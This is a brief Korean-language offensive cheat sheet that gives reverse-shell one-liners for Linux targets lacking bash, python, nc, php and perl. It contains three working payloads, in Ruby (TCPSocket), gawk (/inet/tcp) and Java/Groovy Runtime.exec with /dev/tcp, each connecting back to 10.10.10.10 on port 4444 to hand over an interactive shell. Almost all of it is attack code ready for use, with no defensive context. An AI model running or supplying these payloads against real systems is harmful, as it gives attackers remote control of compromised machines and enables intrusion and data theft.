# linux ruby java awk reverse shell

bash·python·nc·php·perl이 전부 없을 때의 대안. 타깃에 있는 것 하나만 있으면 된다.

```bash
ruby -rsocket -e'f=TCPSocket.open("10.10.10.10",4444).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
```

```bash
# awk — gawk 전용 (/inet 확장은 gawk에만 있고 mawk에는 없음)
awk 'BEGIN {s = "/inet/tcp/0/10.10.10.10/4444"; while(42) { do{ printf "shell>" | & s; s | & getline c; if(c){ while ((c | & getline) > 0) print $0 | & s; close(c); } } while(c != "exit") close(s); }}' /dev/null
```

```java
// jshell·Groovy 콘솔 등 Java 실행 환경에서
r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.10.10.10/4444;cat <&5 | while read line; do $line 2>&5 >&5; done"] as String[])
```
